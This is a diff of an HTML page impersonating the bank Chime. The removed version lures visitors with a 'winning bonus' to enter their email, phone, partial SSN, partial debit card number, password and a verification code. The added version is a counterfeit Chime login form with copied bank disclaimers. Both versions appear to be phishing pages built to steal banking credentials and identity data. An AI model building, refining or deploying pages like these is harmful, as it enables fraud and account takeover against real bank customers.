@@ -4,76 +4,45 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link href="input.css"  rel="stylesheet">
+    <title>Chime</title>
 
-    <title>Chime-Bonus</title>
+    <!-- MAIN CSS -->
+    <link rel="stylesheet" href="/style.css">
 </head>
-<body >
-    <header >
-       <h1>Chime<span>*</span>
-  </h1> 
-    </header>  
-  
-    <div class="img-div">
-        <img src=" https://img1.wsimg.com/isteam/ip/4edfd8ba-90e8-4e96-bd14-8e3b1a70a757/A1BC1240-4CE2-48DE-BBE0-82C99BCB35CD.jpeg/:/rs=w:450,m" alt="promo_banner">
-    </div>
+<body>
+    <main>
+        <header class="section container">
+            <h1>Chime</h1>
+        </header>
 
-    <section >
-        <h3>Enter your information below to activate your winning bonus</h3>
-        <form action="">
-            <div >
-            <input class="inputs" type="email" required placeholder="Email">
-            <p class="text-red font-semibold">Please enter a valid Email address</p>
-            </div>
-            <input class="inputs" type="tel" name="" id="" placeholder="Phone Number" required>
-            <input class="inputs" type="number" name="" id="" required placeholder="Last 4 digits of SSN">
-            <input class="inputs" type="text" placeholder="Last 4 digits of Debit Card" required>
-            <input class="inputs" type="password" name="" id="" placeholder="Password" required>
-       <Button class="bg-greenL  text-black w-full font-bold py-3 rounded min-h-[56px] break-words " type="submit" >Proceed</Button>
-        </form>  
-        
-        <div class="notice">
-            <p class="text-sm break-words">This site is protected by reCAPTCHA and the Google 
-        <a rel="noopener" role="link" aria-haspopup="true" data-ux="Link" target="_blank" href="https://policies.google.com/privacy" data-typography="LinkAlpha" >Privacy Policy</a>
-         and 
-        <a rel="noopener" role="link" aria-haspopup="true" data-ux="Link" target="_blank" href="https://policies.google.com/terms" data-typography="LinkAlpha" >Terms of Service</a>
-    </p> 
-    </div>
-    </section>
-
-  
-
-    <!-- form for verification code -->
-    
-    <section >
-        <h3>Enter the verification code</h3>
-        <form action="">
-            <input class="inputs" type="text" placeholder="Verification Code*" required>
-            <div>
-                <input class="inputs" type="email" required placeholder="Email*">
-                <p>Please enter a valid Email address</p>
+        <section class="container">
+            <div class="section loginDetails">
+                <div class="input">
+                <input type="email" placeholder="Email address">
+                <input type="password" placeholder="Password" class="Fpassword">
                 </div>
-       <Button type="submit" >Verify</Button>
-        </form>  
-        
-        <div class="notice">
-            <p>This site is protected by reCAPTCHA and the Google 
-        <a rel="noopener" role="link" aria-haspopup="true" data-ux="Link" target="_blank" href="https://policies.google.com/privacy" data-typography="LinkAlpha" >Privacy Policy</a>
-         and 
-        <a rel="noopener" role="link" aria-haspopup="true" data-ux="Link" target="_blank" href="https://policies.google.com/terms" data-typography="LinkAlpha" >Terms of Service</a>
-    </p> 
-    </div>
-    </section>
+                <button class="btn">Log In</button>
+            </div>
 
-    <footer>
-        <div>
-<p>Copyright © 2023 Chime   Bonus -  <br> All Rights Reserved.</p>
+            <div class="loginDetails-link">
+                <a href="#">Forgot your email address?</a>
+                <a href="#" class="linkB">Forgot your password?</a>
         </div>
-    </footer>
+     
+        <div class="details">
+       <p class="paragraph-1">By clicking "Log In". you agree to receive SMS text messages from Chime to verify your 
+        identity.</p>
 
-    
+       <p class="paragraph-2">&copy;  2023 Chime. All Rights Reserved.</p>
 
-
-
+       <p class="paragraph-3">Banking Services Provided By The BAmcorp Bank or Stride Bank, N.A Members FDIC. 
+        The Chime Visa * Debit Card is issued by The Bancorp Bank or Stride Bank pursuant to a license
+        from Visa U.S.A. Inc, and may be used everywhere Visa debit cards are accepted.
+        <p class="paragraph-4">Please See back of your Card for its issuing bank.</p> 
+        </p>
+        </div>
+            
+        </section>
+    </main>
 </body>
 </html>
